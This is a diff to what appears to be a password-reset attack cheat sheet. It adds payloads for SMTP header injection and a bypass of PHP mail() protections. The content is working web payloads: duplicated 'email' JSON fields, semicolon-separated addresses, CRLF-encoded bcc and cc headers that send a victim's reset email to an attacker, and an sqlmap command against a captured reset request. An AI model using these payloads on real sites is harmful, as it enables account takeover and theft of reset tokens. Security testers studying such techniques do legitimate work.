@@ -22,7 +22,7 @@ sqlpmap -r pass_reset.txt -p email
 ````
 {"email":"victim@mail.com","email":"attacker@mail.com"}
 ````
-#### Exploiting $to parameter in SMTP header injection
+#### Exploiting $to parameter in SMTP header injection ( This works most of the time in contact-us form)
 - using semicolon separator
 ````
 {"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
@@ -58,4 +58,10 @@ using blind carbon copy
  {"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
  {"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"}
  ````
+ #### Bypass for mail() function protection against email header injection
+ ````
+ {"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
+ {"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"}
+ ````
+ 
 
